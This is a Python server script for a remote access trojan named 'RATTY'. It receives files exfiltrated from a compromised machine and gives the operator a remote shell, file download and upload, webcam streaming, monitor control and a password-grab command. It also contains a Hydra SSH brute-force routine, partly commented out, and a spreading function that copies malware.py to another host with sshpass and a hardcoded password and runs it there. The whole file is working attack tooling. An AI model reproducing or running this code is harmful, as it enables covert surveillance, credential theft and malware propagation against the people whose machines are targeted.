#!/usr/bin/env python3

from re import T
import socket, subprocess, os
from sys import stdout
import pyfiglet
import json
import base64

class SERVER:
    # initialize the server
    def __init__(self, host, port):
        self.host = host
        self.port = port
    # building the connection with the client using socket
    
    def connection(self):
        # setting global variables to use for the connection and subsequent functions.
        global client, addr, sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # providing host and port to bind the connection
        sock.bind((self.host, self.port))
        # marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept()
        sock.listen(5)
        print('Establishing connection with the client')
        # accepting the connection and setting client and addr variable values to the connection values
        client, addr = sock.accept()
        print('Accepting connection with client...')
        # decoding ipv4 to print the connection IP address
        clientip = client.recv(1024).decode()
        print(f'Connection established with {clientip}')

    def CompromisedExfil(self):
        json_data = client.recv(1024).decode()
        convert_json = json.loads(json_data)
        name = convert_json['name']
        bytes = convert_json['data']
        b64decoded_bytes = base64.b64decode(bytes)
        file_name = name.split('.')
        file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
        # #         # receive data and write it to file
        file.write(b64decoded_bytes)
        file.close()

    def RunHydra(self):
        runHydra = False
        fileList = os.listdir(".")
        for file in fileList:
            if file.endswith(".pc"):
                print ("File: " + file)
                with open(file) as thisFile:
                    for line in thisFile:
                        if 'password' in line or 'Hydra attempted:yes' in line:
                            print('password or hydra attempt present')
                            runHydra = False
                        else:
                            print('no password or hydra attempt')
                            runHydra=True
                            break

                with open(file,'a') as thisFile:
                    if runHydra == True:
                        print('run hydra on ' + str(thisFile.name))
                        thisFile.write('\n'+ "Hydra attempted:yes")
                        #hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', "ssh://192.168.56.114"],capture_output=True)
                        #print(hResult.stdout)
                        #TODO parse hydra data and write password to file

                    else:
                        print('do NOT run hydra on ' + str(thisFile.name))    


    def malSpread(self):
        fileList = os.listdir(".")
        for file in fileList:
            if file.endswith(".pc"):
                with open(file) as thisFile:
                    for line in thisFile:
                        thisIP = '192.168.56.115'
                        if 'password' in line or 1 == 1: # TODO always true
                            print("spread attempt")
                            #addSSHResult = subprocess.run(["ssh-keyscan", "-H", thisIP, ">>", "~/.ssh/known_hosts" ],capture_output=True)
                            #print(addSSHResult.stdout)
                            #print(addSSHResult.stderr)

                            transResult = subprocess.run(["sshpass", "-p", "rockyou!", "scp", "./malware.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
                            print(transResult.stdout)
                            print(transResult.stderr)

                            malExecResult = subprocess.run(["sshpass", "-p", "rockyou!", "ssh", "user1@192.168.56.115", "'bash", "-s", "<", "/home/user1/Desktop/malware.py'"],capture_output=True)
                            print(malExecResult.stdout)
                            print(malExecResult.stderr)
                        else:
                            print("no password, no spread")
 
    
    # setting up function for webcam accessability for later use
    def vidstream_server(self):
        try:
            from vidstream import StreamingServer
            global server
            # giving the vidstream server the attacking machine as the host and setting the port to 8080
            server = StreamingServer(self.host, 8080)
            # starting the vidstream server
            server.start_server()
        except:
            print("Vidstream module not installed")
            
    # function to stop the vidstream server       
    def stop_vidstream(self):
        server.stop_vidstream()
    
    # handling user input for the commands later on in the program. Needed to be encoded
    def send_data(self):
        client.send(command.encode())
        data_output = client.recv(1024).decode()
        print(data_output)
        
    # logo for the RAT
    def rattylogo(self):
        logo = pyfiglet.figlet_format("Ratty")
        print(logo)
        print('\n \n ====================================================================== \n \n \n \n Welcome to RATTY, your neighborhood remote administraion tool \n \n')
        
    # prompts given to the user to run commands in the cli    
    def prompts(self):
        print('============================== Commands: ============================== \n \n shutdown                      turns off victim machine \n shell                         makes a shell to interact with victim machine \n webcam                        captures webcam \n webcamoff                     turns off webcam \n monitoron                     turns on monitor \n monitoroff                    turns off monitor \n gimmepw                       gives user password \n upload                        uploads file \n help                          show all commands \n exit                          exit RATTY\n \n======================================================================\n \n')
    
    def shellhelp(self):
        print("To download a file from the client's computer, type: download <file_name_with_extension>")
        
    def mainloop(self):
        self.rattylogo()
        self.prompts()
        while True:
            global command
            command = input('RATTY >>> ')
            
            match command:
                case 'shell':
                    client.send(command.encode())
                    self.shellhelp()
                    while True:
                        command = str(input('$ '))
                        client.send(command.encode())
                        if command == 'exit':
                            break
                        elif command == '':
                            continue
                        elif command[:8] == 'download':
                            json_data = client.recv(1024).decode()
                            print(json_data)
                            convert_json = json.loads(json_data)
                            name = convert_json['name']
                            bytes = convert_json['data']
                            b64decoded_bytes = base64.b64decode(bytes)
                            file_name = name.split('.')
                            file = open(f"{file_name[0]}" + '.' + f"{file_name[1]}",'wb') #open in binary       
                            # receive data and write it to file
                            file.write(b64decoded_bytes)
                            file.close()
                        data_output = client.recv(1024).decode()
                        print(data_output)

                case 'gimmiepw':
                    client.send(command.encode())
                    username = str(input('What is the username? '))
                    client.send(username.encode())
                    out = client.recv(2147483647).decode()
                    print(out)
                
                case 'webcam':
                    client.send(command.encode('utf-8'))
                    self.vidstream_server()
                
                case 'monitoron':
                    self.send_data()
                
                case 'monitoroff':
                    self.send_data()
                
                case 'webcamoff':
                    self.stop_vidstream()
            
                case 'upload':
                    filename = str(input('What file would you like to upload include extension: '))
                    file = open(filename, "rb")
                    bytes = file.read(1024)
                    base64_bytes = base64.b64encode(bytes)
                    file_json = {
                        "name" : file.name,
                        "data" : base64_bytes.decode()
                    }
                    file_send = json.dumps(file_json)
                    client.send(command.encode())
                    client.send(file_send.encode())
                    
            
                case 'help':
                    self.prompts()
                
                case 'exit':
                    bye = pyfiglet.figlet_format('BYE')
                    print(bye)
                    client.send(command.encode())
                    out = client.recv(1024)
                    out = out.decode()
                    print(out)
                    sock.close()
                    client.close() 
                    return

# setting host port and ip to construct with the server class
rat = SERVER('0.0.0.0', 5656)



if __name__ == '__main__':
    rat.connection()
    rat.CompromisedExfil()
    #rat.RunHydra()
    #malSpread()
    rat.mainloop()